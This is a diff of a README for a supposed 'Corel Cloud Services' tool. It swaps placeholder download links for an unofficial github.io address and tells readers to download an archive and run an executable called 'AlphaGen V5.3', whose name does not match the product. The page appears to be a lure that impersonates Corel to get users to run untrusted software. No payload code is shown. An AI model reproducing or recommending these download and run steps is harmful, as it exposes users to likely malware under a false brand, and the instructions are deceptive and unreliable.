@@ -2,13 +2,13 @@
 
 Access, store, and share your CorelDRAW projects securely in the cloud with Corel Cloud Services — seamless design syncing across devices.
 
-[![Download](https://img.shields.io/badge/Download-Corel_Cloud_Services-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Corel_Cloud_Services-blueviolet)](https://corel-cloud-services-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://corel-cloud-services-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to enable Corel Cloud integration  
 4. ✅ Open CorelDRAW and go to `File > Save to Corel Cloud` to start using the service
